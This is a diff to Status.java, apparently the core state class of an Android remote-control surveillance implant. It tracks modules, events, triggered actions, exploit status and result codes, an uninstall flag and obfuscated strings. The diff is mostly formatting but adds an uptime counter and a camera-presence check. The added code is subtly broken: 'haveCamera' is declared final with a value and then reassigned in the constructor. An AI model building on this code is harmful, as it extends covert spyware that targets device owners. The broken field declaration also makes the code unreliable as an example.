@@ -7,13 +7,9 @@
 
 package com.android.dvci;
 
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.os.Handler;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
@@ -30,37 +26,60 @@ import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+
 // Singleton Class
+
 /**
  * The Class Status.
  */
 public class Status {
 	private static final String TAG = "Status"; //$NON-NLS-1$
 
-	/** The agents map. */
+	/**
+	 * The agents map.
+	 */
 	private static HashMap<String, ConfModule> modulesMap;
 
-	/** The events map. */
+	/**
+	 * The events map.
+	 */
 	private static HashMap<Integer, ConfEvent> eventsMap;
 
-	/** The actions map. */
+	/**
+	 * The actions map.
+	 */
 	private static HashMap<Integer, Action> actionsMap;
 
 	private static Globals globals;
 
-	/** The triggered actions. */
+	/**
+	 * The triggered actions.
+	 */
 	private static ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];
 
-	/** The synced. */
+	/**
+	 * The synced.
+	 */
 	static public boolean synced;
 
-	/** The drift. */
+	/**
+	 * The drift.
+	 */
 	static public int drift;
 
-	/** The context. */
+	/**
+	 * The context.
+	 */
 	private static Context context;
 
-	/** For forward compatibility versus 8.0 */
+	/**
+	 * For forward compatibility versus 8.0
+	 */
 	public static boolean calllistCreated = false;
 
 	static Object lockCrisis = new Object();
@@ -73,6 +92,7 @@ public class Status {
 	static public boolean uninstall;
 
 	static WakeLock wl;
+	private final Date startedTime = new Date();
 
 	private boolean deviceAdmin;
 
@@ -86,25 +106,22 @@ public class Status {
 	public static final int EXPLOIT_STATUS_NOT_POSSIBLE = 3;
 
 
-
 	public static final int EXPLOIT_RESULT_NONE = 0;
 	public static final int EXPLOIT_RESULT_FAIL = 1;
 	public static final int EXPLOIT_RESULT_SUCCEED = 2;
 	public static final int EXPLOIT_RESULT_NOTNEEDED = 3;
 
 
-
 	private static int exploitStatus = EXPLOIT_STATUS_NONE;
 	private static int exploitResult = EXPLOIT_RESULT_NONE;
 	RunningProcesses runningProcess = new RunningProcesses();
-	public Object lockFramebuffer =new Object();
+	public Object lockFramebuffer = new Object();
 
 	/**
 	 * Instantiates a new status.
 	 */
 	private Status() {
-		
-		
+
 		modulesMap = new HashMap<String, ConfModule>();
 		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
@@ -114,16 +131,19 @@ public class Status {
 			triggeredActions[i] = new ArrayList<Integer>();
 		}
 
+		haveCamera = checkCameraHardware();
 	}
 
-	/** The singleton. */
+	/**
+	 * The singleton.
+	 */
 	private volatile static Status singleton;
 
 	private static ASG gui;
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the status
 	 */
 	public static Status self() {
@@ -154,9 +174,8 @@ public class Status {
 
 	/**
 	 * Sets the app context.
-	 * 
-	 * @param context
-	 *            the new app context
+	 *
+	 * @param context the new app context
 	 */
 	public static void setAppContext(final Context context) {
 		if (Cfg.DEBUG) {
@@ -177,7 +196,7 @@ public class Status {
 
 	/**
 	 * Gets the app context.
-	 * 
+	 *
 	 * @return the app context
 	 */
 	public static Context getAppContext() {
@@ -207,13 +226,12 @@ public class Status {
 	}
 
 	// Add an agent to the map
+
 	/**
 	 * Adds the agent.
-	 * 
-	 * @param a
-	 *            the a
-	 * @throws GeneralException
-	 *             the RCS exception
+	 *
+	 * @param a the a
+	 * @throws GeneralException the RCS exception
 	 */
 	public static void addModule(final ConfModule a) throws GeneralException {
 		if (modulesMap.containsKey(a.getType()) == true) {
@@ -232,14 +250,13 @@ public class Status {
 	}
 
 	// Add an event to the map
+
 	/**
 	 * Adds the event.
-	 * 
-	 * @param e
-	 *            the e
+	 *
+	 * @param e the e
 	 * @return
-	 * @throws GeneralException
-	 *             the RCS exception
+	 * @throws GeneralException the RCS exception
 	 */
 	public static boolean addEvent(final ConfEvent e) {
 		if (Cfg.DEBUG) {
@@ -258,13 +275,12 @@ public class Status {
 	}
 
 	// Add an action to the map
+
 	/**
 	 * Adds the action.
-	 * 
-	 * @param a
-	 *            the a
-	 * @throws GeneralException
-	 *             the RCS exception
+	 *
+	 * @param a the a
+	 * @throws GeneralException the RCS exception
 	 */
 	public static void addAction(final Action a) {
 		// Don't add the same action twice
@@ -293,7 +309,7 @@ public class Status {
 
 
 	static public String getExploitStatusString() {
-		switch (exploitStatus){
+		switch (exploitStatus) {
 			case EXPLOIT_STATUS_NONE:
 				return M.e("NOT RUN");
 			case EXPLOIT_STATUS_RUNNING:
@@ -309,7 +325,7 @@ public class Status {
 	}
 
 	static public String getExploitResultString() {
-		switch (exploitResult){
+		switch (exploitResult) {
 			case EXPLOIT_RESULT_FAIL:
 				return M.e("FAILED");
 			case EXPLOIT_RESULT_SUCCEED:
@@ -331,7 +347,7 @@ public class Status {
 
 	/**
 	 * Gets the actions number.
-	 * 
+	 *
 	 * @return the actions number
 	 */
 	static public int getActionsNumber() {
@@ -340,7 +356,7 @@ public class Status {
 
 	/**
 	 * Gets the agents number.
-	 * 
+	 *
 	 * @return the agents number
 	 */
 	static public int getAgentsNumber() {
@@ -349,7 +365,7 @@ public class Status {
 
 	/**
 	 * Gets the events number.
-	 * 
+	 *
 	 * @return the events number
 	 */
 	static public int getEventsNumber() {
@@ -358,7 +374,7 @@ public class Status {
 
 	/**
 	 * Gets the agents map.
-	 * 
+	 *
 	 * @return the agents map
 	 */
 	static public HashMap<String, ConfModule> getModulesMap() {
@@ -367,7 +383,7 @@ public class Status {
 
 	/**
 	 * Gets the events map.
-	 * 
+	 *
 	 * @return the events map
 	 */
 	static public HashMap<Integer, ConfEvent> getEventsMap() {
@@ -376,7 +392,7 @@ public class Status {
 
 	/**
 	 * Gets the actions map.
-	 * 
+	 *
 	 * @return the actions map
 	 */
 	static public HashMap<Integer, Action> getActionsMap() {
@@ -385,12 +401,10 @@ public class Status {
 
 	/**
 	 * Gets the action.
-	 * 
-	 * @param index
-	 *            the index
+	 *
+	 * @param index the index
 	 * @return the action
-	 * @throws GeneralException
-	 *             the RCS exception
+	 * @throws GeneralException the RCS exception
 	 */
 	static public Action getAction(final int index) throws GeneralException {
 		if (actionsMap.containsKey(index) == false) {
@@ -408,12 +422,10 @@ public class Status {
 
 	/**
 	 * Gets the event.
-	 * 
-	 * @param id
-	 *            the id
+	 *
+	 * @param id the id
 	 * @return the event
-	 * @throws GeneralException
-	 *             the RCS exception
+	 * @throws GeneralException the RCS exception
 	 */
 	static public ConfEvent getEvent(final int id) throws GeneralException {
 		if (eventsMap.containsKey(id) == false) {
@@ -431,8 +443,7 @@ public class Status {
 
 	/**
 	 * @return the option
-	 * @throws GeneralException
-	 *             the RCS exception
+	 * @throws GeneralException the RCS exception
 	 */
 	static public Globals getGlobals() {
 		return globals;
@@ -440,9 +451,8 @@ public class Status {
 
 	/**
 	 * Trigger action.
-	 * 
-	 * @param i
-	 *            the i
+	 *
+	 * @param i         the i
 	 * @param baseEvent
 	 */
 
@@ -494,7 +504,7 @@ public class Status {
 
 	/**
 	 * Gets the triggered actions.
-	 * 
+	 *
 	 * @return the triggered actions
 	 */
 	static public Trigger[] getTriggeredActions(int qq) {
@@ -546,7 +556,7 @@ public class Status {
 
 	/**
 	 * Dangerous, DO NOT USE
-	 * 
+	 *
 	 * @param qq
 	 * @return
 	 */
@@ -566,9 +576,8 @@ public class Status {
 
 	/**
 	 * Un trigger action.
-	 * 
-	 * @param action
-	 *            the action
+	 *
+	 * @param action the action
 	 */
 	static public void unTriggerAction(final Action action) {
 		int qq = action.getQueue();
@@ -766,13 +775,13 @@ public class Status {
 			}
 		}
 	}
-	
+
 	public synchronized void setReload() {
 		this.reload = true;
 	}
 
 	public synchronized boolean wantsReload() {
-		return this.reload; 
+		return this.reload;
 	}
 
 	public synchronized void unsetReload() {
@@ -785,6 +794,34 @@ public class Status {
 
 	public RunningProcesses getRunningProcess() {
 		return runningProcess;
+	}
+
+	public long startedSeconds() {
+		Date timestamp = new Date();
+		long delta = timestamp.getTime() - startedTime.getTime();
+		if (Cfg.DEBUG) {
+			Check.ensures(delta >= 0, "Can't be negative");
+			Check.log("Started %s seconds ago", (int) delta / 1000);
+		}
+		return delta / 1000;
+	}
+
+
+	public final boolean haveCamera = false;
+	private boolean checkCameraHardware() {
+		if (Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
+			// this device has a camera
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkCameraHardware), camera present");
+			}
+			return true;
+		} else {
+			// no camera on this device
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkCameraHardware), no camera");
+			}
+			return false;
+		}
 	}
 
 }
